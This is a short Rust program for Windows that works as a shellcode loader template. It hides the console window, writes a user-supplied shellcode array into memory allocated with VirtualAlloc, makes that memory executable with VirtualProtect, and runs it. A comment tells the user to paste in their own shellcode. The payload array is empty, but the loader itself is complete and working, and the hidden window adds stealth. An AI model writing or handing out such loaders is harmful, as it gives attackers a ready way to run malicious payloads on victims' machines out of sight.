use std::ptr;
use windows_sys::Win32::System::Console::GetConsoleWindow;
use windows_sys::Win32::UI::WindowsAndMessaging::{ShowWindow, SW_HIDE};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
};

fn hide_console() {
    unsafe {
        let hwnd = GetConsoleWindow();
        if hwnd != std::ptr::null_mut() {
            ShowWindow(hwnd, SW_HIDE);
        }
    } 
}

fn main() {
    hide_console();
let shellcode: [u8; 0] = []; //add your shellcode here And also add bytes of shellcode in [u8; 0], you can check the shellcode bytes by using "wc -c shellcode.bin" in linux's OS

    // Guard — VirtualAlloc returns null on failure
    if shellcode.is_empty() {
        return;
    }

    unsafe {
        let mem = VirtualAlloc(
            ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        assert!(!mem.is_null(), "VirtualAlloc failed — null pointer returned");

        ptr::copy_nonoverlapping(shellcode.as_ptr(), mem as *mut u8, shellcode.len());

        let mut old = 0u32;
        VirtualProtect(mem, shellcode.len(), PAGE_EXECUTE_READ, &mut old);

        let func: extern "system" fn() -> u32 = std::mem::transmute(mem);
        func();
    }
} 
